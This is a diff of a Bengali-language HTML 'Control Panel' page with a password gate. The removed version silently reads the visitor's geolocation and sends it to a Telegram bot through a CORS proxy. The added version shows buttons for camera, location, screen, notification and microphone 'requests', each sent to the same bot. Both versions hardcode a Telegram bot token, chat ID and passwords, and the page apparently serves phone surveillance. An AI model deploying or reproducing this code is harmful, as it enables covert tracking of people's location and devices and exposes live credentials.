@@ -2,65 +2,91 @@
 <html lang="bn">
 <head>
     <meta charset="UTF-8">
-    <title>Secure Admin Panel</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Control Panel</title>
     <style>
-        body { font-family: sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .card { background: #1e293b; padding: 25px; border-radius: 15px; width: 90%; max-width: 400px; text-align: center; }
-        input, .btn { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: none; box-sizing: border-box; }
-        .btn { background: #3b82f6; color: white; cursor: pointer; font-weight: bold; }
+        body { 
+            background: #1a1a2e; 
+            color: #ffffff; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        .container { 
+            background: #16213e; 
+            padding: 30px; 
+            border-radius: 20px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5); 
+            width: 90%; 
+            max-width: 400px; 
+            text-align: center; 
+        }
+        input { 
+            width: 100%; 
+            padding: 15px; 
+            margin-bottom: 20px; 
+            border: none; 
+            border-radius: 10px; 
+            background: #0f3460; 
+            color: white; 
+            box-sizing: border-box;
+            text-align: center;
+        }
+        button { 
+            width: 100%; 
+            padding: 15px; 
+            margin: 10px 0; 
+            border: none; 
+            border-radius: 10px; 
+            background: #e94560; 
+            color: white; 
+            font-size: 16px; 
+            cursor: pointer; 
+            transition: 0.3s; 
+        }
+        button:hover { background: #ff2e63; }
+        .menu { display: none; }
+        h2 { margin-bottom: 20px; color: #4ecca3; }
     </style>
 </head>
 <body>
 
-<!-- লগইন সেকশন -->
-<div class="card" id="loginBox">
-    <h2>Secure Gateway</h2>
-    <input type="password" id="pass" placeholder="Enter Password">
-    <button class="btn" onclick="login()">Access System</button>
-</div>
+    <div class="container">
+        <!-- পাসওয়ার্ড সেকশন -->
+        <div id="login-section">
+            <h2>লগইন করুন</h2>
+            <input type="password" id="pass" placeholder="পাসওয়ার্ড লিখুন">
+            <button onclick="checkPass()">প্রবেশ করুন</button>
+        </div>
 
-<!-- কন্ট্রোল সেকশন -->
-<div class="card" id="mainBox" style="display:none;">
-    <h2>Control Panel</h2>
-    <button class="btn" onclick="runTask()">Initialize & Connect</button>
-    <div id="status" style="margin-top:15px; font-size:13px;">Waiting...</div>
-</div>
+        <!-- মেনু সেকশন -->
+        <div id="main-menu" class="menu">
+            <h2>কন্ট্রোল প্যানেল</h2>
+            <button onclick="sendData('ক্যামেরা')">📷 ক্যামেরা</button>
+            <button onclick="sendData('লোকেশন')">📍 লোকেশন</button>
+            <button onclick="sendData('স্ক্রিন')">📱 মোবাইল স্ক্রিন</button>
+            <button onclick="sendData('নোটিফিকেশন')">🔔 নোটিফিকেশন</button>
+            <button onclick="sendData('মাইক্রোফোন')">🎤 মাইক্রোফোন</button>
+        </div>
+    </div>
 
-<script>
-    const BOT_TOKEN = "8853221737:AAHDigRYNltTvdFGZW4gZahuu3M9dlJHENU";
-    const CHAT_ID = "8566985497";
-
-    function login() {
-        if(document.getElementById('pass').value === "Tamim0186#@") {
-            document.getElementById('loginBox').style.display = 'none';
-            document.getElementById('mainBox').style.display = 'block';
-        } else { alert("Wrong Password!"); }
-    }
-
-    async function runTask() {
-        document.getElementById('status').innerText = "Connecting...";
-        
-        // লোকেশন পাওয়ার চেষ্টা
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const locMsg = `Location: ${pos.coords.latitude}, ${pos.coords.longitude}`;
-                
-                // Proxy যোগ করা হয়েছে এখানে
-                const url = `https://corsproxy.io/?https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(locMsg)}`;
-                
-                try {
-                    await fetch(url);
-                    document.getElementById('status').innerText = "✅ Data Sent Successfully!";
-                } catch(e) {
-                    document.getElementById('status').innerText = "❌ Connection Failed!";
-                }
-            }, () => {
-                document.getElementById('status').innerText = "❌ Permission Denied!";
-            });
-        } else {
-            document.getElementById('status').innerText = "Geolocation not supported.";
+    <script>
+        function checkPass() {
+            if(document.getElementById('pass').value == "1234") {
+                document.getElementById('login-section').style.display = 'none';
+                document.getElementById('main-menu').style.display = 'block';
+            } else { alert("ভুল পাসওয়ার্ড!"); }
         }
-    }
-</script>
+
+        function sendData(type) {
+            const token = "8853221737:AAHDigRYNltTvdFGZW4gZahuu3M9dlJHENU";
+            const chatId = "8566985497";
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=অনুরোধ: ${type}`);
+            alert(type + " পাঠানো হয়েছে!");
+        }
+    </script>
 </body>
 </html>
